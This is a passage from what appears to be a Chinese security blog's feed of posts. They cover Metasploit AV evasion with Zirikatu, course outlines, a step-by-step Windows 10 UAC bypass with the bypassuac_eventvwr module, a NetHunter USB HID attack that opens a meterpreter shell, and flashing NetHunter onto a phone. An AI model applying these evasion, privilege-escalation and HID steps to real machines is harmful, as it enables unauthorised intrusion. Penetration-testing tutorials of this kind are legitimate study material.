src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/4FFF4FC8-5536-40BD-A38D-9597C5F665D5.png" alt="enter description here"></p><h2 id="工具环境安装简单介绍Zirikatu"><a href="#工具环境安装简单介绍Zirikatu" class="headerlink" title="工具环境安装简单介绍Zirikatu"></a>工具环境安装简单介绍Zirikatu</h2><p>环境需求 ：metasploit 以及mono（.net语言运行环境）<br><span style="color: #008000;">mono （Xamarin公司开发的跨平台。NET运行环境）</span><br><span style="color: #008000;">Mono是一个由Xamarin公司（先前是Novell，最早为Ximian）所主持的自由开放源代码项目。该项目的目标是创建一系列匹配ECMA标准（Ecma-334和Ecma-335）的.NET工具，包括C#编译器和通用语言架构。与微软的.NET Framework（共通语言运行平台）不同，Mono项目不仅可以运行于Windows系统上，还可以运行于Linux，FreeBSD，Unix，OS X和Solaris，甚至一些游戏平台，例如：Playstation 3，Wii或XBox 360。</span></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/E58F9A73-DE1B-4342-8EDB-F63BA427886E.png" alt="enter description here"></p><p>并针对在线杀毒网进行多项引擎扫描，可以说是效果不错。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/61947AEB-36B0-4153-94DD-B061B06D237A.png" alt="enter description here"></p><h2 id="以下是针对以上视频步骤录制"><a href="#以下是针对以上视频步骤录制" class="headerlink" title="以下是针对以上视频步骤录制"></a>以下是针对以上视频步骤录制</h2><p><strong><span style="color: #ff0000;">代码可直接复制！！！</span></strong></p><p><strong><span style="color: #ff0000;">代码可直接复制！！！</span></strong></p><p><strong><span style="color: #ff0000;">代码可直接复制！！！</span></strong></p><p><strong><span style="color: #ff0000;">代码可直接复制！！！！</span></strong></p><link rel="stylesheet" type="text/css" href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/asciinema-player.css" /><p>  <asciinema-player src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/zirikatu&msf.json" cols="100" rows="30"></asciinema-player><br>  …<br>  <script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/asciinema-player.js"></script></p><h2 id="感谢关注即刻安全和鄙人博客！！！多谢"><a href="#感谢关注即刻安全和鄙人博客！！！多谢" class="headerlink" title="感谢关注即刻安全和鄙人博客！！！多谢"></a>感谢关注即刻安全和鄙人博客！！！多谢</h2><p>参考资料：<a href="http://www.thinksaas.cn/topics/0/480/480366.html">http://www.thinksaas.cn/topics/0/480/480366.html</a><br>                 <a href="https://github.com/pasahitz/zirikatu">https://github.com/pasahitz/zirikatu</a></p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metaspolit系列课程第一课(即刻&amp;低调群)</title>
      <link href="/msf%E7%B3%BB%E5%88%971.html"/>
      <url>/msf%E7%B3%BB%E5%88%971.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/hack-like-pro-ultimate-command-cheat-sheet-for-metasploits-meterpreter.1280x600.jpg" alt="enter description here"></p><span id="more"></span><h2 id="Dear-莱德斯and杰特们："><a href="#Dear-莱德斯and杰特们：" class="headerlink" title="Dear 莱德斯and杰特们："></a>Dear 莱德斯and杰特们：</h2><pre><code>  感谢支持我们即刻安全推出的metasploit系列教程。  即刻安全从成立到现在，转眼已经半年多了。回头想想当初的我们，凭着一个梦想一股热血，跌跌撞撞的走到了现在。庆幸地是我们都未曾放弃！2017，即刻安全全新起航！感谢一路有你！！！</code></pre><p>metaspolit 课程大纲—课程还在不停变换，希望能增加一些不一样的内容，视频也在不定期的录制</p><h2 id="第一课：metasploit-vulnerability-emulator-搭建靶机与简单利用-——-已录制"><a href="#第一课：metasploit-vulnerability-emulator-搭建靶机与简单利用-——-已录制" class="headerlink" title="第一课：metasploit-vulnerability-emulator 搭建靶机与简单利用 ——-已录制"></a>第一课：metasploit-vulnerability-emulator 搭建靶机与简单利用 ——-已录制</h2><p>链接: <a href="http://pan.baidu.com/s/1o8z4hho">http://pan.baidu.com/s/1o8z4hho</a> 密码: eskf<br><span style="color: #ff0000;">彩蛋—-自己做了个小视频 Babusb&amp;metasploit结合 预览版，可后期继续关注—–metasploit(恶作剧之三部曲)</span></p><p>第二课：st2-045搭建和msf自定义添加st2漏洞rb  已录制 链接: <a href="https://pan.baidu.com/s/1c2BtAVm">https://pan.baidu.com/s/1c2BtAVm</a> 密码: qgg4<br><span style="color: #ff0000;">彩蛋—-自己做的小视频，里面视频内容，代码皆可复制，<a href="https://asciinema.org/a/07zv6rq8ng2oypkp4ty48m7fj">https://asciinema.org/a/07zv6rq8ng2oypkp4ty48m7fj</a><br></span><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/3B5C1B21-0B91-49F9-B872-0954604E3F68.png" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metaspolit系列第二课(即刻&amp;低调)</title>
      <link href="/msf%E7%B3%BB%E5%88%972.html"/>
      <url>/msf%E7%B3%BB%E5%88%972.html</url>
      
        <content type="html"><![CDATA[<p>  终于迎来了自己人生中的第一次系列课程，心中还是有些忐忑不安，怕视频效果不如以前的好，给你们带来不好的体验感<br>  简单的也就做了几课，算是最新的教程吧，目前还在加快录制，视频都是在休息的时候录制，最近上班也比较忙碌，望各位体谅。<br>  <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/punchabunch-just-made-ssh-local-forwarding-stupid-easy.1280x600.jpg" alt="enter description here"><br>  <span id="more"></span><br>  &nbsp;<br>  &nbsp;</p><h1 id="这次-做的是metaspolit系列课程2，也就作为即刻安全的回归的一个小彩蛋。"><a href="#这次-做的是metaspolit系列课程2，也就作为即刻安全的回归的一个小彩蛋。" class="headerlink" title="# 这次 做的是metaspolit系列课程2，也就作为即刻安全的回归的一个小彩蛋。"></a># 这次 做的是metaspolit系列课程2，也就作为即刻安全的回归的一个小彩蛋。</h1><p>  &nbsp;<br>  &nbsp;<br>  <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/jpg.jpg" alt="enter description here"></p><p>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/QQ%E5%9B%BE%E7%89%8720170315090251.jpg" alt="enter description here"><br> &nbsp;</p><h1 id="metaspolit-课程大纲—课程还在不停变换，希望能增加一些不一样的内容，视频也在不定期的录制"><a href="#metaspolit-课程大纲—课程还在不停变换，希望能增加一些不一样的内容，视频也在不定期的录制" class="headerlink" title="# metaspolit 课程大纲—课程还在不停变换，希望能增加一些不一样的内容，视频也在不定期的录制"></a># metaspolit 课程大纲—课程还在不停变换，希望能增加一些不一样的内容，视频也在不定期的录制</h1><p>第一课：metasploit-vulnerability-emulator 搭建靶机与简单利用  ——-已录制<br>&nbsp;<br>第二课：st2-045搭建和msf自定义添加st2漏洞rb  已录制 链接: <a href="https://pan.baidu.com/s/1c2BtAVm">https://pan.baidu.com/s/1c2BtAVm</a> 密码: qgg4<br><span style="color: #ff0000;">彩蛋—-自己做的小视频，里面视频内容，代码皆可复制，<a href="https://asciinema.org/a/07zv6rq8ng2oypkp4ty48m7fj">https://asciinema.org/a/07zv6rq8ng2oypkp4ty48m7fj</a><br>&nbsp;</span><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20170315124719.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>metaspolit_bypassuac_win10</title>
      <link href="/bypassuac-win10.html"/>
      <url>/bypassuac-win10.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/win10_bypassUAC.mp4'    frameborder="0"     allowfullscreen></iframe><p>当你得一个meterpreter会话，却提不了权怎么办？？<br>Demon：嘚吧嘚————<strong><span style="color: #ff0000;">此方法只能绕过本机防护机制，但是绕不过360等。以及此模块需更新最新版即可</span></strong></p><h2 id="第一步：搜索-bypassuac"><a href="#第一步：搜索-bypassuac" class="headerlink" title="第一步：搜索 bypassuac"></a>第一步：搜索 bypassuac</h2>  <pre>msf exploit(web_delivery) > search bypassuac</pre><h2 id="第二步-使用提权模块，进行对windows-uac绕过。"><a href="#第二步-使用提权模块，进行对windows-uac绕过。" class="headerlink" title="第二步: 使用提权模块，进行对windows uac绕过。"></a>第二步: 使用提权模块，进行对windows uac绕过。</h2>  <pre>msf  exploit(web_delivery) > use    exploit/windows/local/bypassuac_eventvwr</pre><p>&#x2F;&#x2F;&#x2F;  查看模块选项  <strong><span style="color: #ff0000;">msf exploit(bypassuac_eventvwr) &gt; </strong></span> options </p><p>Module options (exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr):</p><p>   Name     Current Setting  Required  Description</p><hr><p>   SESSION                   yes       The session to run this module on.</p><p>Exploit target:</p><p>   Id  Name</p><hr><p>   0   Windows x86<br>&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</p><h2 id="第三步：-设置回话-（比如说我这里的话说是1）那就设置1"><a href="#第三步：-设置回话-（比如说我这里的话说是1）那就设置1" class="headerlink" title="第三步： 设置回话 （比如说我这里的话说是1）那就设置1"></a>第三步： 设置回话 （比如说我这里的话说是1）那就设置1</h2>  <pre>msf exploit(bypassuac_eventvwr) > set SESSION 1   SESSION => 1</pre><p>  第四步： 执行exploit，执行提权。<br>  <pre>msf exploit(bypassuac_eventvwr) > exploit</pre><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/3347C261-C404-42C2-91DF-F0127E0EEBA2.png" alt="enter description here"></p><h2 id="第五步-：查看会话，在这里你可以发现有2个回话。"><a href="#第五步-：查看会话，在这里你可以发现有2个回话。" class="headerlink" title="第五步 ：查看会话，在这里你可以发现有2个回话。"></a>第五步 ：查看会话，在这里你可以发现有2个回话。</h2>  <pre> msf exploit(bypassuac_eventvwr) > sessions</pre><p>  <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/3B5F2DCE-F5FC-4BC0-90C7-C45341264BA1.png" alt="enter description here"></p><h2 id="第六步：进入会话2。"><a href="#第六步：进入会话2。" class="headerlink" title="第六步：进入会话2。"></a>第六步：进入会话2。</h2><p>进入meterpreter会话，进行进一步的提权操作.<br>以<strong><span style="color: #ff0000;">及下面是提权前普通用户和 提权后system 最高权限对比！</span></strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/26313E4C-3102-491D-9AE9-966F3AF09478.png" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/465A28FB-C0F5-4D1B-A3B4-CF307434D661.png" alt="enter description here"></p><hr>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑手之kali_Nethuner---HID攻击</title>
      <link href="/nethuner-HID.html"/>
      <url>/nethuner-HID.html</url>
      
        <content type="html"><![CDATA[<h2 id="接着走着黑手——kali-nethuner的坑"><a href="#接着走着黑手——kali-nethuner的坑" class="headerlink" title="接着走着黑手——kali_nethuner的坑"></a><span style="color: #ff0000;">接着走着黑手——kali_nethuner的坑</span></h2><p>继<a  herf=http://www.ggsec.cn/2017/01/27/msf-web-delivery/>Metasploit后门免杀模块之绕过360</a>我想到了一个思路<br>在Nethuner上 可以执行HID 攻击。</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=18155583&auto=0&height=66"></iframe>en##  <span style="color: #ff0000;">HID攻击介绍</span><p>HID是Human Interface Device的缩写，由其名称可以了解HID设备是直接与人交互的设备，例如键盘、鼠标与游戏杆等。不过HID设备并不一定要有人机接口，只要符合HID类别规范的设备都是HID设备。一般来讲针对HID的攻击主要集中在键盘鼠标上，因为只要控制了用户键盘，基本上就等于控制了用户的电脑。攻击者会把攻击隐藏在一个正常的鼠标键盘中，当用户将含有攻击向量的鼠标或键盘，插入电脑时，恶意代码会被加载并执行。</p><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/HID_Attacks1.mp4'    frameborder="0"     allowfullscreen></iframe><h2 id="HID-Attacks—–nethuner"><a href="#HID-Attacks—–nethuner" class="headerlink" title="HID Attacks—–nethuner"></a>HID Attacks—–nethuner</h2><p><span style="color: #ff0000;">nethuner 自带的一个HID 攻击 模拟键盘的功能，通过usb数据线插上pc端，即可绕过安全防护等。</span><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/9BC31A4F-47C1-46E7-9409-C0F2EE1704BE.png" alt="enter description here"></p><p>将代码辅助到此处 执行cmd 命令，以及选择相应的绕过UAC的系统，可执行代码，反弹最终shell，得到meterpreter会话。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/ADD0806E-B337-4DC8-BE45-12E53F3EF77E.png" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/ED374E63-8387-4636-8F49-8158E778FC50.png" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/16A3D110-067F-40CF-9FDD-4B7DA652648E.png" alt="enter description here"></p><p>得到meterpreter会话。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/63920EA7-0CA7-4D48-AD41-C0CDB053ACF7.png" alt="enter description here"></p><h2 id="结语：最好的结语是没有结语。截稿已经是凌晨44分了，太困了"><a href="#结语：最好的结语是没有结语。截稿已经是凌晨44分了，太困了" class="headerlink" title="结语：最好的结语是没有结语。截稿已经是凌晨44分了，太困了"></a>结语：最好的结语是没有结语。截稿已经是凌晨44分了，太困了</h2>]]></content>
      
      
      <categories>
          
          <category> 近源渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HID </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三星Note3 -N9005刷机Kali Nethunter详细教程</title>
      <link href="/nethunter.html"/>
      <url>/nethunter.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0619.JPG" alt="enter description here"></p><span id="more"></span><p>Kali Nethunter 是一款专为渗透测试人员打造的，基于 CyanogenMod 的安卓渗透测试平台。</p><p>我看了一下，现在网上大部分教程都是针对 Nexus 和 one plus 手机的教程，没有针对其他手机的刷入教程，在这里我以我的三星手机为例，手机型号为：Note3 -N9005 来给大家演示下，如何在三星机上刷入 Kali Nethunter。</p><h1 id="友情提示"><a href="#友情提示" class="headerlink" title="友情提示"></a>友情提示</h1><blockquote><p>友情提示：黑手仅仅只能做黑客手机用，切勿当做日常生活用，原因做安全的人都懂得的一个道理。以及刷机之前需要对手机重要数据备份，以免一个数据丢失。未对数据备份，数据丢失，本人不负责。在这里十分感谢kali nethunter 群主的耐心讲解，人非常好，有兴趣的朋友们可以加下群：425901382</p></blockquote><hr><p>本文使用到的工具以及录制视频—–链接：</p><p>链接: <a href="https://pan.baidu.com/s/1c16Wbfy">https://pan.baidu.com/s/1c16Wbfy</a>  密码: ae6h  （录制视频可在线观看）</p><p>以下是官方对支持机型的说明，以及需要刷入的 ROM：<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0603.JPG" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0604.JPG" alt="enter description here"></p><p>—————-需要说明的是，按道理来讲安卓机都是可以刷的。</p><h1 id="安装准备："><a href="#安装准备：" class="headerlink" title="安装准备："></a>安装准备：</h1><ol><li>备用线刷工具包一份，救砖急用！<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0621.JPG" alt="enter description here"></li></ol><p>刷机底包之前需要对设备进行解锁，即root权限，以及刷入第三方 rec 才能进行以下步骤！</p><ol start="2"><li><p>前面刚刚说过了，nethunter 是基于 Cyanogenmod 的安卓第三方 ROM，所以我们需要刷入一款干净的底包，我这边选择的是非官方的底包。cm13 的版本（安卓6.0）以及我这里是三星，note3 或者 s4 等等可以通刷 ，不分运营商版本。即高通 u 可以通刷。—底包针对自己手机型号下载。在这里底包选择5.x~6.x。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0606.JPG" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0605.JPG" alt="enter description here"></p></li><li><p>刷入第三方 rom 包，我们需要对设备解锁，也就是我们日常说的 root 权限，这里我采用三星奥利线刷工具刷入 root 解锁包，使用的是全自动解锁。刷入过程中会多次重启请耐心等待(线刷工具和 root 针对自己手机型号下载）<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0607.JPG" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0608.JPG" alt="enter description here"></p></li><li><p>刷入第三方 rec。—-根据自己手机型号选择第三方 rec 类型。</p></li></ol><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0609.JPG" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0610.JPG" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0611.JPG" alt="enter description here" title="  [12]: http://markdown.xiaoshujiang.com/img/spinner.gif "></p><ol start="5"><li>需要选择需要刷入的 kali nethunter 安装包：arm64 是 64位，armhf32位，找和你 cpu 结构一致的，full 是完整版，minimal 是简版。</li></ol><p>链接：build.nethunter.com&#x2F;nightly&#x2F;3.15.4-20170101-0951&#x2F;</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0612.JPG" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0613.JPG" alt="enter description here"></p><ol start="6"><li>选择手机相对应的nethunter内核：kernel-nethunter 表示是内核，klte 是型号, touchwiz 是基于三星原厂 rom,marshmallow 是 安卓 6.0,lollipop 是 5.x 这里我这边是 cm 是通刷的。所以内核也是通刷三星的。</li></ol><p>刷入完 kali hunter不要重启，直接刷入相关的 nethunter 内核。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0614.JPG" alt="enter description here"></p><ol start="7"><li><p>重启后对手机的相关配置对 ：（一）nethunter 客户端进行一定的 root 权限授权。（二）也不知道为什么刷入直接还需要下载 800 多 MB 的整体包，后来我只好下载了。也可能是我某方面的操作问题。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0615.JPG" alt="enter description here"><br> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0616.JPG" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0617.JPG" alt="enter description here"></p></li><li><p>整体效果预览：<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0619.JPG" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0618.JPG" alt="enter description here"></p></li></ol><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0620.JPG" alt="enter description here"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5ODIwOTM1NA==&mid=2247484924&idx=2&sn=a416dc86243786c70f53899ff0c608dd&chksm=eca81cd9dbdf95cf0b2e2a3380d1b780ce274f8a11bd4803dba55764083108f4ebb270e25bfb&mpshare=1&scene=23&srcid=0106tAn2BvoAXKW9p34My4NS#rd%E2%80%94%E2%80%94%E2%80%94-%E7%A7%BB%E5%8A%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA">http://mp.weixin.qq.com/s?__biz=MzI5ODIwOTM1NA==&amp;mid=2247484924&amp;idx=2&amp;sn=a416dc86243786c70f53899ff0c608dd&amp;chksm=eca81cd9dbdf95cf0b2e2a3380d1b780ce274f8a11bd4803dba55764083108f4ebb270e25bfb&amp;mpshare=1&amp;scene=23&amp;srcid=0106tAn2BvoAXKW9p34My4NS#rd———-移动渗透测试平台搭建</a> – NetHunter 3.0—介绍。。</p><p>后续可参考余弦的教程<a href="http://mp.weixin.qq.com/s?__biz=MzA3NTEzMTUwNA==&mid=2651081148&idx=1&sn=12a3891f4726266c8fbf211f6edb5a04&mpshare=1&scene=23&srcid=0108oH7JzdNGq9vs9a44tUsU#rd%EF%BC%9A%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E3%80%82">http://mp.weixin.qq.com/s?__biz=MzA3NTEzMTUwNA==&amp;mid=2651081148&amp;idx=1&amp;sn=12a3891f4726266c8fbf211f6edb5a04&amp;mpshare=1&amp;scene=23&amp;srcid=0108oH7JzdNGq9vs9a44tUsU#rd：如何安装无线网卡。</a></p>]]></content>
      
      
      <categories>
          
          <category> 近源渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HID </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
